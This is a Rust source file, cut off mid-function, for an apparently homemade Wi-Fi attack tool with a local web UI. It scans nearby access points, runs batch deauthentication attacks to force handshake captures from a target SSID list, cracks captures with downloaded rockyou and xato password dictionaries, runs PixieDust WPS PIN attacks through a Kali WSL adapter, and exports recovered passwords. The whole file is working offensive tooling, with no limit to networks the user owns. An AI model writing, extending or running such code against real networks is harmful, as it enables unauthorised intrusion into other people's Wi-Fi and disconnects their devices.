//! Web UI: axum server on 127.0.0.1 (random port) + wry webview window.
//! The WebView2 renderer bypasses the Intel OpenGL stride artifact entirely.
//! Worker tasks reuse the existing modules; all logging flows through the
//! tracing mirror into the shared event log, polled by the frontend.

use anyhow::{Context, Result};
use axum::extract::{Query, State};
use axum::http::StatusCode;
use axum::routing::{get, post};
use axum::{Json, Router};
use serde::Deserialize;
use serde_json::json;
use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::atomic::AtomicBool;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use crate::config::{self, Config};
use crate::events;
use crate::netsh::{self, InterfaceState, NetworkInfo};
use crate::pipeline::PipelineSummary;
use crate::wslattack::{self, AdapterMode, Ap, PixieOut};

pub struct AppState {
    pub cfg: Mutex<Config>,
    pub config_path: std::path::PathBuf,
    pub busy: Mutex<Option<String>>,
    pub task_started: AtomicBool,
    pub networks: Mutex<Option<Vec<NetworkInfo>>>,
    pub iface: Mutex<Option<InterfaceState>>,
    pub summary: Mutex<Option<PipelineSummary>>,
    pub stop: std::sync::atomic::AtomicBool,
    pub wsl_iface: Mutex<Option<String>>,
    pub wsl_adapter: Mutex<String>,
    pub wsl_state: Mutex<String>,
    pub wsl_aps: Mutex<Vec<Ap>>,
    pub pixie_out: Mutex<Vec<PixieOut>>,
    pub current_session: Mutex<Option<String>>,
    pub crack_scope: Mutex<String>,
    pub sessions: Mutex<Vec<crate::session::SessionInfo>>,
}

impl AppState {
    fn new(cfg: Config) -> Self {
        let config_path =
            config::resolve_config_path(None).unwrap_or_else(|_| "config.toml".into());
        Self {
            cfg: Mutex::new(cfg),
            config_path,
            busy: Mutex::new(None),
            task_started: AtomicBool::new(false),
            networks: Mutex::new(None),
            iface: Mutex::new(None),
            summary: Mutex::new(None),
            stop: std::sync::atomic::AtomicBool::new(false),
            wsl_iface: Mutex::new(None),
            wsl_adapter: Mutex::new("未检测".into()),
            wsl_state: Mutex::new("unknown".into()),
            wsl_aps: Mutex::new(Vec::new()),
            pixie_out: Mutex::new(Vec::new()),
            current_session: Mutex::new(None),
            crack_scope: Mutex::new("latest".into()),
            sessions: Mutex::new(Vec::new()),
        }
    }

    fn spawn_task(
        st: &Arc<AppState>,
        name: &str,
        f: impl FnOnce(Arc<AppState>) + Send + 'static,
    ) -> bool {
        {
            let mut busy = st.busy.lock().unwrap();
            if busy.is_some() {
                return false; // one task at a time
            }
            *busy = Some(name.to_string());
        }
        let owned = st.clone();
        let logname = name.to_string();
        std::thread::spawn(move || {
            events::global().push(format!("--- {logname} 已启动 ---"));
            let r = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| f(owned.clone())));
            if r.is_err() {
                events::global().push("任务异常退出（panic）");
            }
            events::global().push(format!("--- {logname} 结束 ---"));
            *owned.busy.lock().unwrap() = None;
        });
        true
    }
}

// ── routes ──────────────────────────────────────────────────────────────────

async fn index() -> axum::response::Html<&'static str> {
    axum::response::Html(include_str!("web/index.html"))
}

async fn api_state(State(st): State<Arc<AppState>>) -> Json<serde_json::Value> {
    let iface = st.iface.lock().unwrap().clone();
    let summary = st.summary.lock().unwrap().clone();
    let busy = st.busy.lock().unwrap().clone();
    let cfg = st.cfg.lock().unwrap().clone();
    Json(json!({
        "busy": busy,
        "iface": iface,
        "summary": summary,
        "config": cfg,
    }))
}

async fn api_networks(State(st): State<Arc<AppState>>) -> Json<serde_json::Value> {
    let nets = st.networks.lock().unwrap().clone();
    Json(json!({ "networks": nets }))
}

async fn api_wsl(State(st): State<Arc<AppState>>) -> Json<serde_json::Value> {
    Json(json!({
        "state": st.wsl_state.lock().unwrap().clone(),
        "sessions": st.sessions.lock().unwrap().clone(),
        "crack_scope": st.crack_scope.lock().unwrap().clone(),
        "adapter": st.wsl_adapter.lock().unwrap().clone(),
        "iface": st.wsl_iface.lock().unwrap().clone(),
        "aps": st.wsl_aps.lock().unwrap().clone(),
        "pixie": st.pixie_out.lock().unwrap().clone(),
    }))
}

#[derive(Deserialize)]
struct ScopeReq {
    scope: String,
}

async fn api_crackscope(State(st): State<Arc<AppState>>, Json(req): Json<ScopeReq>) -> Json<serde_json::Value> {
    *st.crack_scope.lock().unwrap() = req.scope.clone();
    events::global().push(format!("爆破范围设为: {}", req.scope));
    Json(json!({ "ok": true }))
}

#[derive(Deserialize)]
struct TargetsReq {
    list: Vec<String>,
}

/// In-memory targets sync: the frontend pushes the textarea content before
/// starting any task, so unsaved edits still take effect immediately.
async fn api_targets(State(st): State<Arc<AppState>>, Json(req): Json<TargetsReq>) -> Json<serde_json::Value> {
    let n = req.list.len();
    st.cfg.lock().unwrap().targets.list = req.list;
    events::global().push(format!("目标列表已同步（{} 个，内存生效；「保存配置」才写入 config.toml）", n));
    Json(json!({ "ok": true, "count": n }))
}

#[derive(Deserialize)]
struct HideReq {
    bssids: Vec<String>,
}

async fn api_wsl_hide(State(st): State<Arc<AppState>>, Json(req): Json<HideReq>) -> Json<serde_json::Value> {
    let mut aps = st.wsl_aps.lock().unwrap();
    aps.retain(|a| !req.bssids.iter().any(|b| b.eq_ignore_ascii_case(&a.bssid)));
    Json(json!({ "ok": true, "remaining": aps.len() }))
}

#[derive(Deserialize)]
struct EventsQuery {
    since: Option<u64>,
}

async fn api_events(Query(q): Query<EventsQuery>) -> Json<serde_json::Value> {
    let since = q.since.unwrap_or(0);
    let (last, evs) = events::global().since(since);
    Json(json!({ "last": last, "events": evs }))
}

async fn api_config_post(
    State(st): State<Arc<AppState>>,
    Json(cfg): Json<Config>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    config::save(&cfg, &st.config_path)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("保存失败: {e:#}")))?;
    *st.cfg.lock().unwrap() = cfg;
    events::global().push("配置已保存到 config.toml");
    Ok(Json(json!({ "ok": true })))
}

#[derive(Deserialize)]
struct TaskReq {
    task: String,
    bssid: Option<String>,
    ch: Option<String>,
    essid: Option<String>,
}

async fn api_task(
    State(st): State<Arc<AppState>>,
    Json(req): Json<TaskReq>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    let ok = match req.task.as_str() {
        "quick_scan" => AppState::spawn_task(&st, "快速扫描", |s| task_quick_scan(s)),
        "scan" => AppState::spawn_task(&st, "深度扫描", |s| task_scan(s)),
        "capture" => AppState::spawn_task(&st, "抓包", |s| task_capture(s)),
        "crack" => AppState::spawn_task(&st, "爆破", |s| task_crack(s)),
        "export" => AppState::spawn_task(&st, "导出密码", |s| task_export(s)),
        "full" => AppState::spawn_task(&st, "全流程", |s| task_full(s)),
        "dict_xato" => AppState::spawn_task(&st, "下载top100万", |s| task_dict(s, false)),
        "dict_rockyou" => AppState::spawn_task(&st, "下载rockyou", |s| task_dict(s, true)),
        "wsl_attach" => AppState::spawn_task(&st, "WSL接入网卡", |s| task_wsl_attach(s)),
        "wsl_scan" => AppState::spawn_task(&st, "WSL扫描", |s| task_wsl_scan(s)),
        "wsl_capture" => {
            let (b, c, e) = match (req.bssid.clone(), req.ch.clone(), req.essid.clone()) {
                (Some(b), Some(c), Some(e)) => (b, c, e),
                _ => return Err((StatusCode::BAD_REQUEST, "需要 bssid/ch/essid".into())),
            };
            AppState::spawn_task(&st, "WSL定向抓包", move |s| task_wsl_capture(s, b, c, e))
        }
        "wsl_batch_pin" => AppState::spawn_task(&st, "WSL批量PIN", |s| task_wsl_batch(s, true)),
        "wsl_batch_cap" => AppState::spawn_task(&st, "WSL批量抓包", |s| task_wsl_batch(s, false)),
        "stop_batch" => {
            st.stop.store(true, std::sync::atomic::Ordering::Relaxed);
            events::global().push("已请求停止批量任务（当前项完成后生效）");
            return Ok(Json(json!({ "ok": true })));
        }
        "wsl_pixie" => {
            let (b, e) = match (req.bssid.clone(), req.essid.clone()) {
                (Some(b), Some(e)) => (b, e),
                _ => return Err((StatusCode::BAD_REQUEST, "需要 bssid/essid".into())),
            };
            AppState::spawn_task(&st, "WSL PixieDust", move |s| task_wsl_pixie(s, b, e))
        }
        other => {
            return Err((StatusCode::BAD_REQUEST, format!("unknown task: {}", other)));
        }
    };
    if ok {
        Ok(Json(json!({ "ok": true })))
    } else {
        Err((StatusCode::CONFLICT, "已有任务在运行".into()))
    }
}

// ── task bodies ─────────────────────────────────────────────────────────────

fn task_quick_scan(st: Arc<AppState>) {
    let cfg = st.cfg.lock().unwrap().clone();
    match crate::scan::quick_scan(4, Duration::from_secs(3), None) {
        Ok(nets) => {
            let n = nets.len();
            let mut sorted = nets;
            sorted.sort_by_key(|x| std::cmp::Reverse(x.signal.unwrap_or(0)));
            *st.networks.lock().unwrap() = Some(sorted);
            events::global().push(format!("扫描完成，共 {} 个 SSID", n));
        }
        Err(e) => events::global().push(format!("扫描失败: {e:#}")),
    }
    let _ = cfg;
}

fn task_scan(st: Arc<AppState>) {
    let cfg = st.cfg.lock().unwrap().clone();
    let logs_dir = config::ensure_logs_dir();
    let restore_to = cfg.scan.disconnect_first.then(|| {
        netsh::show_interface().ok().and_then(|i| i.ssid).unwrap_or_default()
    });
    match crate::scan::scan(&cfg.scan, restore_to.as_deref()) {
        Ok(res) => {
            if let Err(e) = crate::scan::save_result(&res, &logs_dir) {
                events::global().push(format!("保存结果失败: {e:#}"));
            }
        }
        Err(e) => events::global().push(format!("扫描失败: {e:#}")),
    }
}

fn task_capture(st: Arc<AppState>) {
    let cfg = st.cfg.lock().unwrap().clone();
    let logs_dir = config::ensure_logs_dir();
    let caps_dir = crate::capture::caps_dir(&logs_dir);
    match crate::capture::capture(
        &cfg.capture,
        &cfg.crack.acng_bin,
        &cfg.targets.list,
        &caps_dir,
    ) {
        Ok(res) => {
            if let Err(e) = crate::capture::save_result(&res, &logs_dir) {
                events::global().push(format!("保存结果失败: {e:#}"));
            }
        }
        Err(e) => events::global().push(format!("抓包失败: {e:#}")),
    }
}

fn task_crack(st: Arc<AppState>) {
    let cfg = st.cfg.lock().unwrap().clone();
    let logs_dir = config::ensure_logs_dir();
    let scope = st.crack_scope.lock().unwrap().clone();
    let caps_root = crate::capture::caps_dir(&logs_dir);
    let dicts = cfg.effective_dicts();
    events::global().push(format!(
        "爆破：模式字典={}，字典文件 {} 个{}",
        if cfg.crack.use_patterns { "开" } else { "关" },
        dicts.len(),
        if cfg.crack.full8 { "（含全量8位数字）" } else { "" }
    ));
    let (caps, skipped, label) =
        match crate::session::scope_caps(&caps_root, &scope, Some(&cfg.crack.acng_bin)) {
            Ok(v) => v,
            Err(e) => {
                events::global().push(format!("爆破中止: {e:#}"));
                return;
            }
        };
    events::global().push(format!(
        "爆破范围 [{label}]：有效 cap {} 个，跳过无握手 {skipped} 个",
        caps.len()
    ));
    if caps.is_empty() {
        events::global().push("没有含握手的 cap — 先抓到握手再爆破（跑字典也找不到密码）");
        return;
    }
    match crate::crack::crack_caps_files(&cfg.crack.acng_bin, &caps, &cfg.crack, &dicts, None) {
        Ok(res) => {
            if let Err(e) = crate::crack::save_result(&res, &logs_dir) {
                events::global().push(format!("保存结果失败: {e:#}"));
            }
        }
        Err(e) => events::global().push(format!("爆破失败: {e:#}")),
    }
}

fn task_export(_st: Arc<AppState>) {
    let logs_dir = config::ensure_logs_dir();
    match crate::pipeline::export_passwords(&logs_dir) {
        Ok(p) => events::global().push(format!("导出完成 -> {}", p.display())),
        Err(e) => events::global().push(format!("导出失败: {e:#}")),
    }
}

fn task_full(st: Arc<AppState>) {
    let cfg = st.cfg.lock().unwrap().clone();
    let logs_dir = config::ensure_logs_dir();
    match crate::pipeline::run_full(&cfg, &logs_dir, None) {
        Ok(s) => *st.summary.lock().unwrap() = Some(s),
        Err(e) => events::global().push(format!("全流程失败: {e:#}")),
    }
}

/// Match a target SSID to a scanned AP: exact -> contains -> token.
fn find_ap_for_target<'a>(target: &str, aps: &'a [Ap]) -> Option<&'a Ap> {
    let t = target.to_lowercase();
    if let Some(a) = aps.iter().find(|a| a.essid.to_lowercase() == t) {
        return Some(a);
    }
    if let Some(a) = aps.iter().find(|a| a.essid.to_lowercase().contains(&t)) {
        return Some(a);
    }
    let tokens: Vec<String> = regex::Regex::new(r"[-_]")
        .unwrap()
        .split(&t)
        .filter(|p| p.chars().count() >= 2)
        .map(|p| p.to_string())
        .collect();
    aps.iter()
        .find(|a| tokens.iter().any(|tok| a.essid.to_lowercase().contains(tok)))
}

fn task_wsl_batch(st: Arc<AppState>, do_pin: bool) {
    let (distro, tmo, sec, acng_bin) = {
        let c = st.cfg.lock().unwrap();
        (c.wsl.distro.clone(), c.wsl.pixie_timeout_sec, c.capture.duration_sec, c.crack.acng_bin.clone())
    };
    st.stop.store(false, std::sync::atomic::Ordering::Relaxed);
    if !wslattack::has_device(&distro) || wslattack::find_iface(&distro).is_none() {
        *st.wsl_iface.lock().unwrap() = None;
        events::global().push("网卡未就绪（可能已掉线）— 请先点「1 接入网卡」，再批量");
        return;
    }
    let Some(iface) = st.wsl_iface.lock().unwrap().clone() else {
        events::global().push("先执行「接入网卡」");
        return;
    };
    let aps = st.wsl_aps.lock().unwrap().clone();
    let targets = st.cfg.lock().unwrap().targets.list.clone();
    if targets.is_empty() {
        events::global().push("目标列表为空 — 在扫描结果里点「加入」或手动输入");
        return;
    }
    let mode = if do_pin {
        format!("PixieDust（每目标超时 {tmo}s）")
    } else {
        format!("定向抓包（每目标 {sec}s）")
    };
    // Each batch run is its own session directory, so cracking "本次" never
    // touches caps from previous runs.
    let sess_name = chrono::Local::now().format("%Y%m%d_%H%M%S").to_string();
    let sess_rel = sess_name.clone();
    {
        let root = config::ensure_logs_dir();
        let _ = std::fs::create_dir_all(root.join("caps").join(&sess_name));
        *st.current_session.lock().unwrap() = Some(sess_name.clone());
    }
    events::global().push(format!("本次抓包会话: logs/caps/{}", sess_name));
    events::global().push(format!(
        "批量开始：{} 个目标 x {}",
        targets.len(),
        mode
    ));
    let logs_dir = config::ensure_logs_dir();
    let caps_abs = std::fs::canonicalize(logs_dir.join("caps"))
        .unwrap_or_else(|_| std::path::PathBuf::from("logs/caps"));
    let caps_win = caps_abs
        .to_string_lossy()
        .trim_start_matches(std::path::MAIN_SEPARATOR)
        .trim_start_matches("?")
        .trim_start_matches(std::path::MAIN_SEPARATOR)
        .to_string();
    let caps_win = match st.current_session.lock().unwrap().clone() {
        Some(sess) => format!("{}\\{}", caps_win, sess),
        None => caps_win,
    };
    let caps_str = if caps_win.as_bytes().get(1) == Some(&b':') {
        format!("/mnt/{}{}", (caps_win.as_bytes()[0] as char).to_lowercase(), &caps_win[2..])
    } else {
        caps_win.clone()
    };

    let mut done = 0usize;
    let mut hits = 0usize;
    let mut ok_cnt = 0usize;
    let mut fail_cnt = 0usize;
    let total = targets.len();
    for (idx, tgt) in targets.iter().enumerate() {
        if st.stop.load(std::sync::atomic::Ordering::Relaxed) {
            events::global().push(format!("批量中止于 {}/{}（用户停止）", idx, total));
            break;
        }
        let Some(ap) = find_ap_for_target(tgt, &aps) else {
            events::global().push(format!("  [{}/{}] {} — 扫描结果中不可见，跳过", idx + 1, total, tgt));
            continue;
        };
        let ap = ap.clone();
        events::global().push(format!(
            "  [{}/{}] {} ({}, ch{}) …",
            idx + 1, total, ap.essid, ap.bssid, ap.channel
        ));
        if do_pin {
            match wslattack::pixie(&distro, &iface, &ap.bssid, tmo) {
                Ok(mut p) => {
                    p.essid = Some(ap.essid.clone());
                    p.signal = Some(ap.power);
                    if p.pin.is_some() {
                        hits += 1;
                        events::global().push(format!(
                            "    *** 命中 {} PIN={} PSK={}（已保存） ***",
                            ap.essid,
                            p.pin.as_deref().unwrap_or("?"),
                            p.psk.as_deref().unwrap_or("(无)")
                        ));
                    } else {
                        events::global().push(format!("    未命中 {}", ap.essid));
                    }
                    let _ = crate::session::record_hit(&config::ensure_logs_dir(), p.clone());
                    *st.pixie_out.lock().unwrap() =
                        crate::session::load_hits(&config::ensure_logs_dir());
                }
                Err(e) => events::global().push(format!("    失败: {e:#}")),
            }
        } else {
            let (cap, hs) = wslattack::capture_deauth(
                &distro, &iface, &ap.bssid, &ap.channel, &ap.essid, sec,
                std::path::Path::new(&caps_win), &acng_bin,
            );
            if let Some(file) = cap {
                ok_cnt += 1;
                let fname = std::path::Path::new(&file)
                    .file_name()
                    .map(|f| f.to_string_lossy().to_string())
                    .unwrap_or_default();
                if !fname.is_empty() {
                    let _ = crate::session::record_cap(
                        &config::ensure_logs_dir().join("caps").join(&sess_rel),
                        &fname, Some(&ap.essid), Some(&ap.bssid), Some(&ap.channel),
                    );
                }
                if let Some(true) = hs {
                    events::global().push(format!("    抓到握手包！-> {file}"));
                } else {
                    events::global().push(format!("    抓包完成（未含握手）-> {file}"));
                }
            } else {
                fail_cnt += 1;
                events::global().push("    抓包失败: 未产出 cap 文件".to_string());
            }
        }
        done += 1;
    }
    let mut without = 0usize;
    if !do_pin {
        let caps_root = config::ensure_logs_dir().join("caps").join(&sess_rel);
        events::global().push("  检查各 cap 是否抓到握手…");
        match crate::session::finalize_manifest(&caps_root, &acng_bin) {
            Ok((with_hs, wo)) => {
                without = wo;
                events::global().push(format!(
                    "  会话结果：有效握手 {with_hs} 个 / 无握手 {without} 个"
                ));
            }
            Err(e) => events::global().push(format!("  握手检查失败: {e:#}")),
        }
    }
    if do_pin {
        events::global().push(format!("批量结束：处理 {done} 个，命中 {hits} 个"));
    } else if ok_cnt > 0 {
        events::global().push(format!(
            "批量结束：抓包成功 {ok_cnt} 个、失败 {fail_cnt} 个（logs/caps/）— 可点右栏「爆破」跑字典"
        ));
        if without > 0 {
            events::global().push(
                "提示：部分目标无握手（踢线已执行过）——说明当时目标网络里没有在线设备可踢。可调大「抓包时长」守候，或稍后重试。",
            );
        }
    } else {
        events::global().push(format!(
            "批量结束：抓包全部失败（{fail_cnt} 个）— 未产出任何 cap，无法爆破；请检查网卡后重试"
        ));
    }
}

fn task_dict(st: Arc<AppState>, rockyou: bool) {
    let dir = st.cfg.lock().unwrap().crack.dicts_dir.clone();
    let _ = std::fs::create_dir_all(&dir);
    let targets: Vec<(&str, &str, &str, u64)> = if rockyou {
        vec![(
            "rockyou.txt",
            "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
            "134MB",
            100_000_000,
        )]
    } else {
        vec![
            ("xato100w.txt", "https://fastly.jsdelivr.net/gh/danielmiessler/SecLists@master/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt", "8.5MB", 1_000_000),
            ("xato100w.txt", "https://gcore.jsdelivr.net/gh/danielmiessler/SecLists@master/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt", "8.5MB", 1_000_000),
            ("xato100w.txt", "https://cdn.jsdelivr.net/gh/danielmiessler/SecLists@master/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt", "8.5MB", 1_000_000),
        ]
    };
    for (name, url, size, min) in targets {
        let dest = dir.join(name);
        if dest.exists() {
            events::global().push(format!("已存在，跳过: {name}"));
            continue;
        }
        events::global().push(format!("下载 {name} ({size})…"));
        let s = std::process::Command::new("curl")
            .args(["-sfL", "--retry", "2", "--max-time", "1800", "-o"])
            .arg(&dest)
            .arg(url)
            .status();
        match s {
            Ok(s) if s.success() && dest.metadata().map(|m| m.len() >= min).unwrap_or(false) => {
                events::global().push(format!("下载完成: {name}"));
                break;
            }
            _ => {
                events::global().push("该源失败，尝试下一个镜像…");
                let _ = std::fs::remove_file(&dest);
            }
        }
    }
}

// ── WSL hardware tasks ──────────────────────────────────────────────────────

/// Derived hardware state machine:
/// missing / msc / wlan_detached / wlan_pending (attached, no iface) / ready
fn wsl_state_summary(distro: &str) -> (&'static str, String, Option<String>) {
    // An existing monitor interface is the ground truth for "ready" —
    // usbipd's Persisted section can make adapter() look "未接入" even
    // while everything is up.
    if let Some(i) = wslattack::find_iface(distro) {
        let desc = wslattack::adapter()
            .map(|a| a.busid)
            .unwrap_or_else(|| "网卡".to_string());
        return ("ready", format!("{} [已就绪|{} 监听中]", desc, i), Some(i));
    }
    match wslattack::adapter() {
        None => ("missing", "未检测到监听网卡".into(), None),
        Some(a) => match a.mode {
            AdapterMode::Msc => (
                "msc",
                format!("{} [U盘模式{}]", a.busid, if a.attached { "|已挂WSL" } else { "" }),
                None,
            ),
            AdapterMode::Wlan => {
                if !a.attached {
                    ("wlan_detached", format!("{} [WiFi模式|未接入]", a.busid), None)
                } else {
                    match wslattack::find_iface(distro) {
                        Some(i) => (
                            "ready",
                            format!("{} [已就绪|{} 监听中]", a.busid, i),
                            Some(i),
                        ),
                        None => (
                            "wlan_pending",
                            format!("{} [WiFi模式|待激活监听]", a.busid),
                            None,
                        ),
                    }
                }
            }
        },
    }
}

fn wsl_adapter_summary() -> String {
    match wslattack::adapter() {
        None => "未检测到（请插入网卡）".into(),
        Some(a) => {
            let mode = match a.mode {
                AdapterMode::Msc => "U盘模式(需切换)",
                AdapterMode::Wlan => "WiFi模式",
            };
            let state = if a.attached {
                "已接入WSL"
            } else if a.shared {
                "已共享"
            } else {
                "未共享"
            };
            format!("{} [{}|{}]", a.busid, mode, state)
        }
    }
}

fn task_wsl_attach(st: Arc<AppState>) {
    let distro = st.cfg.lock().unwrap().wsl.distro.clone();

    // Fast path: already up and in monitor — nothing to do.
    if let Some(iface) = wslattack::find_iface(&distro) {
        if wslattack::up_monitor(&distro, &iface).is_ok() {
            *st.wsl_iface.lock().unwrap() = Some(iface.clone());
            let (state, summary, _) = wsl_state_summary(&distro);
            *st.wsl_state.lock().unwrap() = state.into();
            *st.wsl_adapter.lock().unwrap() = summary;
            events::global().push(format!("网卡已就绪（{iface} 监听模式），无需重新接入"));
            return;
        }
    }

    // Iterative bring-up: every round re-detects the adapter state, so mode
    // switches during recovery (detach can power-cycle back to MSC) are
    // handled naturally. 3 rounds is enough for any realistic sequence.
    'rounds: for round in 1..=3 {
        let Some(info) = wslattack::adapter() else {
            events::global().push("未检测到监听网卡 — 请插入 Tenda U2 (AIC8800) 或 RTL8812AU");
            return;
        };
        events::global().push(format!(
            "[第 {round} 轮] {} [{}|{}{}]",
            info.busid,
            if info.mode == AdapterMode::Msc { "U盘模式" } else { "WiFi模式" },
            if info.attached { "已挂WSL" } else { "未挂" },
            if info.shared { "" } else { "|未共享" }
        ));

        match info.mode {
            AdapterMode::Msc => {
                if info.attached {
                    // Attached to WSL: eject from inside Kali. The eject
                    // utility often errors yet the SCSI switch still fires.
                    events::global().push("  在 Kali 内弹出伪U盘…");
                    match wslattack::eject_msc(&distro) {
                        Ok(v) => events::global().push(format!(
                            "  弹出{}",
                            if v { "指令已发送" } else { "：WSL 内未找到 U 盘设备" }
                        )),
                        Err(e) => events::global().push(format!("  弹出报错（通常仍会切换）: {e:#}")),
                    }
                    // Wait for re-enumeration into WLAN mode.
                    let mut seen_wlan = false;
                    for _ in 0..15 {
                        std::thread::sleep(std::time::Duration::from_secs(1));
                        if let Some(a) = wslattack::adapter() {
                            if a.mode == AdapterMode::Wlan {
                                seen_wlan = true;
                                break;
                            }
                        }
                    }
                    if !seen_wlan {
                        events::global().push("  未回到 WiFi 模式");
                        continue 'rounds;
                    }
                    events::global().push("  已切换为 WiFi 模式");
                } else {
                    // On Windows: attach first; if Windows claims the storage,
                    // fall back to a Windows-side shell eject.
                    events::global().push("  接入 U盘模式…");
                    if let Err(e) = wslattack::attach(&info) {
                        events::global().push(format!("  接入被拒（{e:#}），改用 Windows 侧弹出…"));
                        let _ = wslattack::windows_eject_msc();
                        continue 'rounds;
                    }
                    std::thread::sleep(std::time::Duration::from_secs(3));
                    let _ = wslattack::eject_msc(&distro);
                    let mut seen_wlan = false;
                    for _ in 0..15 {
                        std::thread::sleep(std::time::Duration::from_secs(1));
                        if let Some(a) = wslattack::adapter() {
                            if a.mode == AdapterMode::Wlan {
                                seen_wlan = true;
                                break;
                            }
                        }
                    }
                    if !seen_wlan {
                        events::global().push("  未回到 WiFi 模式");
                        continue 'rounds;
                    }
                    events::global().push("  已切换为 WiFi 模式");
                }
            }
            AdapterMode::Wlan => {
                if !info.attached {
                    events::global().push("  接入 WSL…");
                    if let Err(e) = wslattack::attach(&info) {
                        events::global().push(format!("  接入失败: {e:#}"));
                        continue 'rounds;
                    }
                }
                std::thread::sleep(std::time::Duration::from_secs(2));
                if wslattack::has_device(&distro) {
                    break 'rounds; // device in the VM — go load the driver
                }
                // Stale attach (Windows says attached, VM restarted): detach,
                // re-attach. The detach may power-cycle back to MSC — the next
                // round handles that.
                events::global().push("  陈旧接入 — 清除后重挂…");
                wslattack::detach(&info.busid);
                std::thread::sleep(std::time::Duration::from_secs(2));
                let _ = std::process::Command::new(wslattack::USBIPD)
                    .args(["attach", "--wsl", "--busid", &info.busid])
                    .output();
                std::thread::sleep(std::time::Duration::from_secs(4));
                if wslattack::has_device(&distro) {
                    break 'rounds;
                }
            }
        }
    }

    if !wslattack::has_device(&distro) {
        events::global().push("多轮尝试后设备仍未进入 WSL — 请拔插网卡后重试");
        let (state, summary, _) = wsl_state_summary(&distro);
        *st.wsl_state.lock().unwrap() = state.into();
        *st.wsl_adapter.lock().unwrap() = summary;
        return;
    }

    // No udev coldplug in WSL — load the driver explicitly (self-healing).
    if let Err(e) = wslattack::load_driver(&distro) {
        events::global().push(format!("驱动加载失败: {e:#}"));
        return;
    }
    std::thread::sleep(std::time::Duration::from_secs(2));
    // WSL timing race: if the module loaded after the device, the USB probe
    // sometimes doesn't fire — reload the module once to force re-probe.
    let mut iface = wslattack::find_iface(&distro);
    if iface.is_none() {
        events::global().push("接口未出现，重载驱动强制重新探测…");
        let _ = wslattack::kali(&distro, "modprobe -r aic8800_fdrv aic_load_fw 2>/dev/null; sleep 1; modprobe aic8800_fdrv; sleep 3");
        iface = wslattack::find_iface(&distro);
    }
    let Some(iface) = iface else {
        events::global().push("WSL 内未发现 wlan 接口 — 检查 lsusb / 驱动");
        let (state, summary, _) = wsl_state_summary(&distro);
        *st.wsl_state.lock().unwrap() = state.into();
        *st.wsl_adapter.lock().unwrap() = summary;
        return;
    };
    match wslattack::up_monitor(&distro, &iface) {
        Ok(()) => {
            *st.wsl_iface.lock().unwrap() = Some(iface.clone());
            let (state, summary, _) = wsl_state_summary(&distro);
            *st.wsl_state.lock().unwrap() = state.into();
            *st.wsl_adapter.lock().unwrap() = summary;
            events::global().push(format!("网卡就绪：{iface} 已进监听模式"));
        }
        Err(e) => events::global().push(format!("监听模式失败: {e:#}")),
    }
}

fn task_wsl_scan(st: Arc<AppState>) {
    let distro = st.cfg.lock().unwrap().wsl.distro.clone();
    let Some(iface) = st.wsl_iface.lock().unwrap().clone() else {
        events::global().push("先执行「接入网卡」");
        return;
    };
    match wslattack::scan_aps(&distro, &iface) {
        Ok(aps) => {
            let n = aps.len();
            events::global().push(format!("WSL 扫描完成：{} 个 AP（按信号排序）", n));
            for a in aps.iter().take(15) {
                events::global().push(format!(
                    "  {:18} {} dBm ch{} {}",
                    if a.essid.len() > 18 { &a.essid[..18] } else { &a.essid },
                    a.power,
                    a.channel,
                    a.bssid
                ));
            }
            *st.wsl_aps.lock().unwrap() = aps;
        }
        Err(e) => events::global().push(format!("WSL 扫描失败: {e:#}")),
    }
}

fn task_wsl_capture(st: Arc<AppState>, bssid: String, ch: String, essid: String) {
    let (distro, sec, acng_bin) = {
        let c = st.cfg.lock().unwrap();
        (c.wsl.distro.clone(), c.capture.duration_sec, c.crack.acng_bin.clone())
    };
    let Some(iface) = st.wsl_iface.lock().unwrap().clone() else {
        events::global().push("先执行「接入网卡」");
        return;
    };
    if !wslattack::has_device(&distro) || wslattack::find_iface(&distro).is_none() {
        *st.wsl_iface.lock().unwrap() = None;
        events::global().push("网卡未就绪（可能已掉线）— 请先点「1 接入网卡」");
        return;
    }
    let logs_dir = config::ensure_logs_dir();
    // ad-hoc single captures join the current session, or open a new one
    {
        let mut cur = st.current_session.lock().unwrap();
        if cur.is_none() {
            let name = chrono::Local::now().format("single_%Y%m%d_%H%M%S").to_string();
            let _ = std::fs::create_dir_all(logs_dir.join("caps").join(&name));
            *cur = Some(name);
        }
    }
    let sess = st.current_session.lock().unwrap().clone().unwrap();
    let caps_abs = std::fs::canonicalize(logs_dir.join("caps")).unwrap_or_else(|_| std::path::PathBuf::from("logs/caps"));
    let caps_root = logs_dir.join("caps");
    // strip the \\?\ canonical prefix and map X:\... -> /mnt/x/... for Linux
    let caps_win = caps_abs
        .to_string_lossy()
        .trim_start_matches(std::path::MAIN_SEPARATOR)
        .trim_start_matches("?")
        .trim_start_matches(std::path::MAIN_SEPARATOR)
        .to_string();
    let caps_win = format!("{}\\{}", caps_win, sess);
    let caps_str = if caps_win.as_bytes().get(1) == Some(&b':') {
        format!("/mnt/{}{}", (caps_win.as_bytes()[0] as char).to_lowercase(), &caps_win[2..])
    } else {
        caps_win.clone()
    };
    events::global().push(format!("定向抓包+踢线辅助 {essid} ({bssid} ch{ch}) {sec}s…"));
    let (cap, hs) = wslattack::capture_deauth(
        &distro, &iface, &bssid, &ch, &essid, sec,
        std::path::Path::new(&caps_win), &acng_bin,
    );
    if let Some(file) = cap {
        let fname = std::path::Path::new(&file)
            .file_name()
            .map(|f| f.to_string_lossy().to_string())
            .unwrap_or_default();
        if !fname.is_empty() {
            let _ = crate::session::record_cap(
                &caps_root.join(&sess), &fname, Some(&essid), Some(&bssid), Some(&ch),
            );
        }
        match hs {
            Some(true) => events::global().push(format!("  抓到握手包！-> {file}（可点右栏「爆破」）")),
            Some(false) => events::global().push(format!("  抓包完成但未含握手 -> {file}")),
            None => events::global().push(format!("抓包完成 -> {file}")),
        }
    } else {
        events::global().push("抓包失败: 未产出 cap 文件".to_string());
    }
}

fn task_wsl_pixie(st: Arc<AppState>, bssid: String, essid: String) {
    let (distro, tmo) = {
        let c = st.cfg.lock().unwrap();
